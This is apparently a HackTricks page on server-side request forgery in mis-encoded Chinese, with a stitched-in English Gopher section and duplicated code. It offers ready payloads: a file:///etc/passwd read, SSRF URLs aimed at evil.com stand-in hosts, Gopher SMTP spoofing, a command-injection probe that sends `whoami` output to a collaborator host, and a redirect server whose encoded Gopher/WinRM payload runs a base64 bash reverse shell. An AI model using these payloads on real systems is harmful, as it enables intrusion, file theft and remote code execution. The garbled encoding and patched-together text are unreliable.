# SSRFï¼ˆæœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼‰

![](<../../.gitbook/assets/image (9) (1) (2).png>)

\
ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>â˜ï¸ HackTricks Cloud â˜ï¸</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ğŸ¦ Twitter ğŸ¦</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ğŸ™ï¸ Twitch ğŸ™ï¸</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ğŸ¥ Youtube ğŸ¥</strong></a></summary>

* ä½ åœ¨**ç½‘ç»œå®‰å…¨å…¬å¸**å·¥ä½œå—ï¼Ÿä½ æƒ³åœ¨HackTricksä¸­çœ‹åˆ°ä½ çš„**å…¬å¸å¹¿å‘Š**å—ï¼Ÿæˆ–è€…ä½ æƒ³è·å¾—**PEASSçš„æœ€æ–°ç‰ˆæœ¬æˆ–ä¸‹è½½PDFæ ¼å¼çš„HackTricks**å—ï¼Ÿè¯·æŸ¥çœ‹[**è®¢é˜…è®¡åˆ’**](https://github.com/sponsors/carlospolop)ï¼
* å‘ç°æˆ‘ä»¬çš„ç‹¬å®¶[NFT](https://opensea.io/collection/the-peass-family)æ”¶è—å“[**The PEASS Family**](https://opensea.io/collection/the-peass-family)
* è·å–[**å®˜æ–¹PEASSå’ŒHackTrickså‘¨è¾¹äº§å“**](https://peass.creator-spring.com)
* **åŠ å…¥**[**ğŸ’¬**](https://emojipedia.org/speech-balloon/) [**Discordç¾¤ç»„**](https://discord.gg/hRep4RUj7f)æˆ–[**ç”µæŠ¥ç¾¤ç»„**](https://t.me/peass)æˆ–**å…³æ³¨**æˆ‘åœ¨**Twitter**ä¸Šçš„[**ğŸ¦**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**ã€‚**
* **é€šè¿‡å‘**[**hacktricks repo**](https://github.com/carlospolop/hacktricks) **å’Œ**[**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud) **æäº¤PRæ¥åˆ†äº«ä½ çš„é»‘å®¢æŠ€å·§ã€‚**

</details>

æœåŠ¡å™¨ç«¯è¯·æ±‚ä¼ªé€ ï¼ˆä¹Ÿç§°ä¸ºSSRFï¼‰æ˜¯ä¸€ç§Webå®‰å…¨æ¼æ´ï¼Œå…è®¸æ”»å‡»è€…è¯±ä½¿æœåŠ¡å™¨ç«¯åº”ç”¨ç¨‹åºå‘æ”»å‡»è€…é€‰æ‹©çš„ä»»æ„åŸŸå‘å‡ºHTTPè¯·æ±‚ã€‚ï¼ˆæ¥è‡ª[è¿™é‡Œ](https://portswigger.net/web-security/ssrf)ï¼‰

## æ•è·SSRF

é¦–å…ˆï¼Œæ‚¨éœ€è¦æ•è·ç”±æ‚¨å¼•å‘çš„SSRFäº¤äº’ã€‚æ‚¨å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å·¥å…·æ¥æ•è·HTTPæˆ–DNSäº¤äº’ï¼š

* **Burpcollab**
* [**pingb**](http://pingb.in)
* [**canarytokens**](https://canarytokens.org/generate)
* [**interractsh**](https://github.com/projectdiscovery/interactsh)
* [**http://webhook.site**](http://webhook.site)
* [**https://github.com/teknogeek/ssrf-sheriff**](https://github.com/teknogeek/ssrf-sheriff)

## ç»•è¿‡ç™½åå•åŸŸ

é€šå¸¸ï¼Œæ‚¨ä¼šå‘ç°SSRFä»…åœ¨**æŸäº›ç™½åå•åŸŸ**æˆ–URLä¸­èµ·ä½œç”¨ã€‚åœ¨ä¸‹ä¸€é¡µä¸­ï¼Œæ‚¨å¯ä»¥æ‰¾åˆ°**å°è¯•ç»•è¿‡ç™½åå•çš„æŠ€æœ¯æ±‡ç¼–**ï¼š

{% content-ref url="url-format-bypass.md" %}
[url-format-bypass.md](url-format-bypass.md)
{% endcontent-ref %}

### é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡

å¦‚æœæœåŠ¡å™¨å—åˆ°æ­£ç¡®çš„ä¿æŠ¤ï¼Œæ‚¨å¯ä»¥é€šè¿‡åˆ©ç”¨ç½‘é¡µå†…çš„å¼€æ”¾é‡å®šå‘æ¥**ç»•è¿‡æ‰€æœ‰é™åˆ¶**ã€‚å› ä¸ºç½‘é¡µå°†å…è®¸**å¯¹åŒä¸€åŸŸè¿›è¡ŒSSRF**ï¼Œå¹¶ä¸”å¯èƒ½ä¼š**è·Ÿéšé‡å®šå‘**ï¼Œæ‚¨å¯ä»¥åˆ©ç”¨**å¼€æ”¾é‡å®šå‘ä½¿æœåŠ¡å™¨è®¿é—®ä»»ä½•å†…éƒ¨èµ„æº**ã€‚\
åœ¨æ­¤å¤„é˜…è¯»æ›´å¤šä¿¡æ¯ï¼š[https://portswigger.net/web-security/ssrf](https://portswigger.net/web-security/ssrf)

## åè®®

### file://
```
file:///etc/passwd
```
### dict://

DICT URLæ–¹æ¡ˆç”¨äºå¼•ç”¨ä½¿ç”¨DICTåè®®å¯ç”¨çš„å®šä¹‰æˆ–å•è¯åˆ—è¡¨ï¼š
```
dict://<user>;<auth>@<host>:<port>/d:<word>:<database>:<n>
ssrf.php?url=dict://attacker:11111/
```
### SFTP://

ä¸€ç§ç”¨äºé€šè¿‡å®‰å…¨å¤–å£³è¿›è¡Œå®‰å…¨æ–‡ä»¶ä¼ è¾“çš„ç½‘ç»œåè®®
```
ssrf.php?url=sftp://evil.com:11111/
```
### TFTP://

ç®€å•æ–‡ä»¶ä¼ è¾“åè®®ï¼Œé€šè¿‡UDPå·¥ä½œ
```
ssrf.php?url=tftp://evil.com:12346/TESTUDPPACKET
```
### LDAP://

è½»é‡çº§ç›®å½•è®¿é—®åè®®ã€‚å®ƒæ˜¯ä¸€ç§åº”ç”¨åè®®ï¼Œç”¨äºåœ¨IPç½‘ç»œä¸Šç®¡ç†å’Œè®¿é—®åˆ†å¸ƒå¼ç›®å½•ä¿¡æ¯æœåŠ¡ã€‚
```
ssrf.php?url=ldap://localhost:11211/%0astats%0aquit
```
### Gopher://

ä½¿ç”¨æ­¤åè®®ï¼Œæ‚¨å¯ä»¥æŒ‡å®šè¦æœåŠ¡å™¨**å‘é€**çš„**IPã€ç«¯å£å’Œå­—èŠ‚**ã€‚ç„¶åï¼Œæ‚¨åŸºæœ¬ä¸Šå¯ä»¥åˆ©ç”¨ SSRF ä¸ä»»ä½• TCP æœåŠ¡å™¨**é€šä¿¡**ï¼ˆä½†æ‚¨éœ€è¦å…ˆäº†è§£å¦‚ä½•ä¸è¯¥æœåŠ¡è¿›è¡Œé€šä¿¡ï¼‰ã€‚\
å¹¸è¿çš„æ˜¯ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨ [Gopherus](https://github.com/tarunkant/Gopherus) ä¸ºå¤šä¸ªæœåŠ¡åˆ›å»ºæœ‰æ•ˆè½½è·ã€‚æ­¤å¤–ï¼Œ[remote-method-guesser](https://github.com/qtc-de/remote-method-guesser) å¯ç”¨äºä¸º _Java RMI_ æœåŠ¡åˆ›å»º _gopher_ æœ‰æ•ˆè½½è·ã€‚

**Gopher smtp**
```
ssrf.php?url=gopher://127.0.0.1:25/xHELO%20localhost%250d%250aMAIL%20FROM%3A%3Chacker@site.com%3E%250d%250aRCPT%20TO%3A%3Cvictim@site.com%3E%250d%250aDATA%250d%250aFrom%3A%20%5BHacker%5D%20%3Chacker@site.com%3E%250d%250aTo%3A%20%3Cvictime@site.com%3E%250d%250aDate%3A%20Tue%2C%2015%20Sep%202017%2017%3A20%3A26%20-0400%250d%250aSubject%3A%20AH%20AH%20AH%250d%250a%250d%250aYou%20didn%27t%20say%20the%20magic%20word%20%21%250d%250a%250d%250a%250d%250a.%250d%250aQUIT%250d%250a
will make a request like
HELO localhost
MAIL FROM:<hacker@site.com>
RCPT TO:<victim@site.com>
DATA
From: [Hacker] <hacker@site.com>
To: <victime@site.com>
Date: Tue, 15 Sep 2017 17:20:26 -0400
Subject: Ah Ah AHYou didn't say the magic word !
.
QUIT
```
**Gopher HTTP**

Gopher is a protocol that allows the retrieval of documents over the Internet. It was popular in the early days of the web but has since been largely replaced by HTTP. However, Gopher is still supported by some servers and can be used for SSRF attacks.

SSRF (Server-Side Request Forgery) is a vulnerability that allows an attacker to make requests from the server to other internal or external resources. By exploiting SSRF, an attacker can potentially access sensitive information, perform port scanning, or even pivot to other systems within the network.

In the context of SSRF, Gopher can be used as a transport protocol to bypass restrictions and access internal resources. The basic idea is to craft a Gopher URL that points to the desired resource and then make a request to the server using this URL.

To perform a Gopher SSRF attack, follow these steps:

1. Identify the SSRF vulnerability in the target application.
2. Craft a Gopher URL that points to the desired resource. The URL should follow the format `gopher://<attacker-controlled-IP>:<attacker-controlled-port>/`.
3. Send the crafted Gopher URL as a request to the server.
4. Analyze the response from the server to determine if the attack was successful.

It's important to note that Gopher SSRF attacks may not work in all scenarios, as many servers have disabled or restricted Gopher support. Additionally, the success of the attack depends on the specific implementation of the server and the security measures in place.

To mitigate the risk of Gopher SSRF attacks, it is recommended to:

- Implement proper input validation and sanitization to prevent SSRF vulnerabilities.
- Disable or restrict Gopher support on servers that do not require it.
- Regularly update and patch server software to address any known vulnerabilities.

By understanding the Gopher protocol and its potential for SSRF attacks, you can better protect your applications and systems from exploitation.
```bash
#For new lines you can use %0A, %0D%0A
gopher://<server>:8080/_GET / HTTP/1.0%0A%0A
gopher://<server>:8080/_POST%20/x%20HTTP/1.0%0ACookie: eatme%0A%0AI+am+a+post+body
```
**Gopher SMTP â€” åå‘è¿æ¥åˆ° 1337**

{% code title="redirect.php" %}
```php
<?php
header("Location: gopher://hack3r.site:1337/_SSRF%0ATest!");
?>Now query it.
https://example.com/?q=http://evil.com/redirect.php.
```
{% endcode %}

### SMTP

ä» [https://twitter.com/har1sec/status/1182255952055164929](https://twitter.com/har1sec/status/1182255952055164929)ï¼š

1. ä½¿ç”¨SSRFè¿æ¥åˆ°smtp localhost:25
2. ä»ç¬¬ä¸€è¡Œè·å–å†…éƒ¨åŸŸå 220[ http://blabla.internaldomain.com ](https://t.co/Ad49NBb7xy)ESMTP Sendmail
3. åœ¨githubä¸Šæœç´¢[ http://internaldomain.com ](https://t.co/K0mHR0SPVH)ï¼Œæ‰¾åˆ°å­åŸŸå
4. è¿æ¥

### Curl URL globbing - WAFç»•è¿‡

å¦‚æœSSRFç”±**curl**æ‰§è¡Œï¼Œcurlæœ‰ä¸€ä¸ªç§°ä¸º[**URL globbing**](https://everything.curl.dev/cmdline/globbing)çš„åŠŸèƒ½ï¼Œå¯ä»¥ç”¨äºç»•è¿‡WAFã€‚ä¾‹å¦‚ï¼Œåœ¨è¿™ä¸ª[**writeup**](https://blog.arkark.dev/2022/11/18/seccon-en/#web-easylfi)ä¸­ï¼Œä½ å¯ä»¥æ‰¾åˆ°ä¸€ä¸ªé€šè¿‡`file`åè®®è¿›è¡Œ**è·¯å¾„éå†**çš„ç¤ºä¾‹ï¼š
```
file:///app/public/{.}./{.}./{app/public/hello.html,flag.txt}
```
## æ•è·SSRFè¯·æ±‚

* Burp Collaborator
* [http://requestrepo.com/](http://requestrepo.com/)
* [https://app.interactsh.com/](https://app.interactsh.com/)
* [https://github.com/stolenusername/cowitness](https://github.com/stolenusername/cowitness)

## é€šè¿‡Referrerå¤´å®ç°SSRF

ä¸€äº›åº”ç”¨ç¨‹åºä½¿ç”¨æœåŠ¡å™¨ç«¯åˆ†æè½¯ä»¶æ¥è·Ÿè¸ªè®¿é—®è€…ã€‚è¯¥è½¯ä»¶é€šå¸¸ä¼šè®°å½•è¯·æ±‚ä¸­çš„Referrerå¤´ï¼Œå› ä¸ºè¿™å¯¹äºè·Ÿè¸ªä¼ å…¥é“¾æ¥ç‰¹åˆ«é‡è¦ã€‚é€šå¸¸ï¼Œåˆ†æè½¯ä»¶å®é™…ä¸Šä¼šè®¿é—®å‡ºç°åœ¨Referrerå¤´ä¸­çš„ä»»ä½•ç¬¬ä¸‰æ–¹URLã€‚è¿™é€šå¸¸æ˜¯ä¸ºäº†åˆ†æå¼•ç”¨ç«™ç‚¹çš„å†…å®¹ï¼ŒåŒ…æ‹¬ä¼ å…¥é“¾æ¥ä¸­ä½¿ç”¨çš„é”šæ–‡æœ¬ã€‚å› æ­¤ï¼ŒRefererå¤´é€šå¸¸ä»£è¡¨äº†SSRFæ¼æ´çš„æœ‰åˆ©æ”»å‡»é¢ã€‚\
è¦å‘ç°è¿™ç§â€œéšè—â€çš„æ¼æ´ï¼Œæ‚¨å¯ä»¥ä½¿ç”¨Burpçš„æ’ä»¶â€œ**Collaborator Everywhere**â€ã€‚

## é€šè¿‡è¯ä¹¦çš„SNIæ•°æ®å®ç°SSRF

æœ€ç®€å•çš„é…ç½®é”™è¯¯ï¼Œå…è®¸æ‚¨è¿æ¥åˆ°ä»»æ„åç«¯ï¼Œå¯èƒ½å¦‚ä¸‹æ‰€ç¤ºï¼š
```nginx
stream {
server {
listen 443;
resolver 127.0.0.11;
proxy_pass $ssl_preread_server_name:443;
ssl_preread on;
}
}
```
åœ¨è¿™é‡Œï¼ŒSNIå­—æ®µçš„å€¼ç›´æ¥ç”¨ä½œåç«¯çš„åœ°å€ã€‚

é€šè¿‡è¿™ç§ä¸å®‰å…¨çš„é…ç½®ï¼Œæˆ‘ä»¬å¯ä»¥é€šè¿‡åœ¨SNIå­—æ®µä¸­æŒ‡å®šæ‰€éœ€çš„IPæˆ–åŸŸåæ¥åˆ©ç”¨SSRFæ¼æ´ã€‚ä¾‹å¦‚ï¼Œä»¥ä¸‹å‘½ä»¤å°†å¼ºåˆ¶Nginxè¿æ¥åˆ°_internal.host.com_ï¼š
```bash
openssl s_client -connecttarget.com:443 -servername "internal.host.com" -crlf
```
## [ä½¿ç”¨Wgetä¸Šä¼ æ–‡ä»¶](../file-upload/#wget-file-upload-ssrf-trick)

## SSRFä¸å‘½ä»¤æ³¨å…¥

å¯ä»¥å°è¯•ä½¿ç”¨å¦‚ä¸‹è´Ÿè½½ï¼š`` url=http://3iufty2q67fuy2dew3yug4f34.burpcollaborator.net?`whoami` ``

## PDFæ¸²æŸ“

å¦‚æœç½‘é¡µè‡ªåŠ¨åˆ›å»ºäº†ä¸€ä¸ªåŒ…å«ä½ æä¾›çš„ä¸€äº›ä¿¡æ¯çš„PDFï¼Œä½ å¯ä»¥**æ’å…¥ä¸€äº›JSä»£ç ï¼Œè¿™äº›ä»£ç å°†ç”±PDFåˆ›å»ºè€…ï¼ˆæœåŠ¡å™¨ï¼‰åœ¨åˆ›å»ºPDFæ—¶æ‰§è¡Œ**ï¼Œä»è€Œæ»¥ç”¨SSRFã€‚[**åœ¨è¿™é‡Œæ‰¾åˆ°æ›´å¤šä¿¡æ¯**](../xss-cross-site-scripting/server-side-xss-dynamic-pdf.md)**.**

## ä»SSRFåˆ°DoS

åˆ›å»ºå¤šä¸ªä¼šè¯ï¼Œå¹¶å°è¯•åˆ©ç”¨ä¼šè¯ä¸­çš„SSRFä¸‹è½½å¤§æ–‡ä»¶ã€‚

## SSRF PHPå‡½æ•°

{% content-ref url="../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md" %}
[php-ssrf.md](../../network-services-pentesting/pentesting-web/php-tricks-esp/php-ssrf.md)
{% endcontent-ref %}

## SSRFé‡å®šå‘åˆ°Gopher

å¯¹äºæŸäº›åˆ©ç”¨ï¼Œæ‚¨å¯èƒ½éœ€è¦**å‘é€é‡å®šå‘å“åº”**ï¼ˆå¯èƒ½ä½¿ç”¨ä¸åŒçš„åè®®ï¼Œå¦‚gopherï¼‰ã€‚è¿™é‡Œæœ‰ä¸åŒçš„Pythonä»£ç ç”¨äºå“åº”é‡å®šå‘ï¼š
```python
# First run: openssl req -new -x509 -keyout server.pem -out server.pem -days 365 -nodes
from http.server import HTTPServer, BaseHTTPRequestHandler
import ssl

class MainHandler(BaseHTTPRequestHandler):
def do_GET(self):
print("GET")
self.send_response(301)

self.send_header("Location", "gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20%31%30%2e%31%30%2e%31%31%2e%31%31%37%3a%35%39%38%36%0d%0a%55%73%65%72%2d%41%67%65%6e%74%3a%20%70%79%74%68%6f%6e%2d%72%65%71%75%65%73%74%73%2f%32%2e%32%35%2e%31%0d%0a%41%63%63%65%70%74%2d%45%6e%63%6f%64%69%6e%67%3a%20%67%7a%69%70%2c%20%64%65%66%6c%61%74%65%0d%0a%41%63%63%65%70%74%3a%20%2a%2f%2a%0d%0a%43%6f%6e%6e%65%63%74%69%6f%6e%3a%20%63%6c%6f%73%65%0d%0a%43%6f%6e%74%65%6e%74%2d%54%79%70%65%3a%20%61%70%70%6c%69%63%61%74%69%6f%6e%2f%73%6f%61%70%2b%78%6d%6c%3b%63%68%61%72%73%65%74%3d%55%54%46%2d%38%0d%0a%43%6f%6e%74%65%6e%74%2d%4c%65%6e%67%74%68%3a%20%31%37%32%38%0d%0a%0d%0a%3c%73%3a%45%6e%76%65%6c%6f%70%65%20%78%6d%6c%6e%73%3a%73%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%33%2f%30%35%2f%73%6f%61%70%2d%65%6e%76%65%6c%6f%70%65%22%20%78%6d%6c%6e%73%3a%61%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%22%20%78%6d%6c%6e%73%3a%68%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%69%6e%64%6f%77%73%2f%73%68%65%6c%6c%22%20%78%6d%6c%6e%73%3a%6e%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%39%2f%65%6e%75%6d%65%72%61%74%69%6f%6e%22%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%6d%69%63%72%6f%73%6f%66%74%2e%63%6f%6d%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%77%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%6d%61%6e%2f%31%2f%77%73%6d%61%6e%2e%78%73%64%22%20%78%6d%6c%6e%73%3a%78%73%69%3d%22%68%74%74%70%3a%2f%2f%77%77%77%2e%77%33%2e%6f%72%67%2f%32%30%30%31%2f%58%4d%4c%53%63%68%65%6d%61%22%3e%0a%20%20%20%3c%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%20%20%20%3c%61%3a%54%6f%3e%48%54%54%50%3a%2f%2f%31%39%32%2e%31%36%38%2e%31%2e%31%3a%35%39%38%36%2f%77%73%6d%61%6e%2f%3c%2f%61%3a%54%6f%3e%0a%20%20%20%20%20%20%3c%77%3a%52%65%73%6f%75%72%63%65%55%52%49%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%3c%2f%77%3a%52%65%73%6f%75%72%63%65%55%52%49%3e%0a%20%20%20%20%20%20%3c%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%20%20%20%3c%61%3a%41%64%64%72%65%73%73%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%78%6d%6c%73%6f%61%70%2e%6f%72%67%2f%77%73%2f%32%30%30%34%2f%30%38%2f%61%64%64%72%65%73%73%69%6e%67%2f%72%6f%6c%65%2f%61%6e%6f%6e%79%6d%6f%75%73%3c%2f%61%3a%41%64%64%72%65%73%73%3e%0a%20%20%20%20%20%20%3c%2f%61%3a%52%65%70%6c%79%54%6f%3e%0a%20%20%20%20%20%20%3c%61%3a%41%63%74%69%6f%6e%3e%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%2f%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%3c%2f%61%3a%41%63%74%69%6f%6e%3e%0a%20%20%20%20%20%20%3c%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%3e%31%30%32%34%30%30%3c%2f%77%3a%4d%61%78%45%6e%76%65%6c%6f%70%65%53%69%7a%65%3e%0a%20%20%20%20%20%20%3c%61%3a%4d%65%73%73%61%67%65%49%44%3e%75%75%69%64%3a%30%41%42%35%38%30%38%37%2d%43%32%43%33%2d%30%30%30%35%2d%30%30%30%30%2d%30%30%30%30%30%30%30%31%30%30%30%30%3c%2f%61%3a%4d%65%73%73%61%67%65%49%44%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%50%54%31%4d%33%30%53%3c%2f%77%3a%4f%70%65%72%61%74%69%6f%6e%54%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%77%3a%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%70%3a%44%61%74%61%4c%6f%63%61%6c%65%20%78%6d%6c%3a%6c%61%6e%67%3d%22%65%6e%2d%75%73%22%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%66%61%6c%73%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%4f%70%74%69%6f%6e%53%65%74%20%73%3a%6d%75%73%74%55%6e%64%65%72%73%74%61%6e%64%3d%22%74%72%75%65%22%20%2f%3e%0a%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%20%20%20%20%20%20%3c%77%3a%53%65%6c%65%63%74%6f%72%20%4e%61%6d%65%3d%22%5f%5f%63%69%6d%6e%61%6d%65%73%70%61%63%65%22%3e%72%6f%6f%74%2f%73%63%78%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%3e%0a%20%20%20%20%20%20%3c%2f%77%3a%53%65%6c%65%63%74%6f%72%53%65%74%3e%0a%20%20%20%3c%2f%73%3a%48%65%61%64%65%72%3e%0a%20%20%20%3c%73%3a%42%6f%64%79%3e%0a%20%20%20%20%20%20%3c%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%20%78%6d%6c%6e%73%3a%70%3d%22%68%74%74%70%3a%2f%2f%73%63%68%65%6d%61%73%2e%64%6d%74%66%2e%6f%72%67%2f%77%62%65%6d%2f%77%73%63%69%6d%2f%31%2f%63%69%6d%2d%73%63%68%65%6d%61%2f%32%2f%53%43%58%5f%4f%70%65%72%61%74%69%6e%67%53%79%73%74%65%6d%22%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%63%6f%6d%6d%61%6e%64%3e%65%63%68%6f%20%2d%6e%20%59%6d%46%7a%61%43%41%74%61%53%41%2b%4a%69%41%76%5a%47%56%32%4c%33%52%6a%63%43%38%78%4d%43%34%78%4d%43%34%78%4e%43%34%78%4d%53%38%35%4d%44%41%78%49%44%41%2b%4a%6a%45%3d%20%7c%20%62%61%73%65%36%34%20%2d%64%20%7c%20%62%61%73%68%3c%2f%70%3a%63%6f%6d%6d%61%6e%64%3e%0a%20%20%20%20%20%20%20%20%20%3c%70%3a%74%69%6d%65%6f%75%74%3e%30%3c%2f%70%3a%74%69%6d%65%6f%75%74%3e%0a%20%20%20%20%20%20%3c%2f%70%3a%45%78%65%63%75%74%65%53%68%65%6c%6c%43%6f%6d%6d%61%6e%64%5f%49%4e%50%55%54%3e%0a%20%20%20%3c%2f%73%3a%42%6f%64%79%3e%0a%3c%2f%73%3a%45%6e%76%65%6c%6f%70%65%3e%0a")
```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
self.end_headers()

httpd = HTTPServer(('0.0.0.0', 443), MainHandler)
httpd.socket = ssl.wrap_socket(httpd.socket, certfile="server.pem", server_side=True)
httpd.serve_forever()
```

```python
from flask import Flask, redirect
from urllib.parse import quote
app = Flask(__name__)

@app.route('/')
def root():
return redirect('gopher://127.0.0.1:5985/_%50%4f%53%54%20%2f%77%73%6d%61%6e%20%48%54%54%50%2f%31%2e%31%0d%0a%48%6f%73%74%3a%20', code=301)

if __name__ == "__main__":
app.run(ssl_context='adhoc', debug=True, host="0.0.0.0", port=8443)
```
![](<../../.gitbook/assets/image (9) (1) (2).png>)

ä½¿ç”¨[**Trickest**](https://trickest.com/?utm\_campaign=hacktrics\&utm\_medium=banner\&utm\_source=hacktricks)å¯ä»¥è½»æ¾æ„å»ºå’Œè‡ªåŠ¨åŒ–ç”±å…¨çƒæœ€å…ˆè¿›çš„ç¤¾åŒºå·¥å…·æä¾›æ”¯æŒçš„å·¥ä½œæµç¨‹ã€‚\
ç«‹å³è·å–è®¿é—®æƒé™ï¼š

{% embed url="https://trickest.com/?utm_campaign=hacktrics&utm_medium=banner&utm_source=hacktricks" %}

## DNS Rebidding CORS/SOPç»•è¿‡

å¦‚æœç”±äºCORS/SOPçš„é™åˆ¶è€Œæ— æ³•ä»æœ¬åœ°IPä¸­çªƒå–å†…å®¹ï¼Œå¯ä»¥ä½¿ç”¨DNS Rebiddingç»•è¿‡è¯¥é™åˆ¶ï¼š

{% content-ref url="../cors-bypass.md" %}
[cors-bypass.md](../cors-bypass.md)
{% endcontent-ref %}

### è‡ªåŠ¨åŒ–DNS Rebidding

[**`Singularity of Origin`**](https://github.com/nccgroup/singularity)æ˜¯ä¸€ç§æ‰§è¡Œ[DNS rebinding](https://en.wikipedia.org/wiki/DNS\_rebinding)æ”»å‡»çš„å·¥å…·ã€‚å®ƒåŒ…æ‹¬é‡æ–°ç»‘å®šæ”»å‡»æœåŠ¡å™¨DNSåç§°çš„IPåœ°å€åˆ°ç›®æ ‡æœºå™¨çš„IPåœ°å€ä»¥åŠæä¾›æ”»å‡»è½½è·ä»¥åˆ©ç”¨ç›®æ ‡æœºå™¨ä¸Šçš„æ˜“å—æ”»å‡»çš„è½¯ä»¶æ‰€éœ€çš„ç»„ä»¶ã€‚

è¿˜å¯ä»¥åœ¨[**http://rebind.it/singularity.html**](http://rebind.it/singularity.html)ä¸ŠæŸ¥çœ‹å…¬å¼€è¿è¡Œçš„æœåŠ¡å™¨\*\*\*\*

## DNS Rebidding + TLSä¼šè¯ID/ä¼šè¯ç¥¨è¯

è¦æ±‚ï¼š

* **SSRF**
* **å‡ºç«™TLSä¼šè¯**
* **æœ¬åœ°ç«¯å£ä¸Šçš„å†…å®¹**

æ”»å‡»æ­¥éª¤ï¼š

1. è¦æ±‚ç”¨æˆ·/æœºå™¨äººè®¿é—®ç”±æ”»å‡»è€…æ§åˆ¶çš„**åŸŸå**
2. **DNS**çš„**TTL**ä¸º**0**ç§’ï¼ˆå› æ­¤å—å®³è€…å°†å¾ˆå¿«å†æ¬¡æ£€æŸ¥åŸŸåçš„IPï¼‰
3. åœ¨å—å®³è€…å’Œæ”»å‡»è€…åŸŸä¹‹é—´åˆ›å»º**TLSè¿æ¥**ã€‚æ”»å‡»è€…åœ¨**ä¼šè¯IDæˆ–ä¼šè¯ç¥¨è¯**ä¸­å¼•å…¥**è½½è·**ã€‚
4. **åŸŸå**å°†å¯¹**è‡ªèº«**å‘èµ·**æ— é™é‡å®šå‘å¾ªç¯**ã€‚è¿™æ ·åšçš„ç›®çš„æ˜¯ä½¿ç”¨æˆ·/æœºå™¨äººè®¿é—®è¯¥åŸŸåï¼Œç›´åˆ°å†æ¬¡æ‰§è¡Œ**åŸŸåçš„DNSè¯·æ±‚**ã€‚
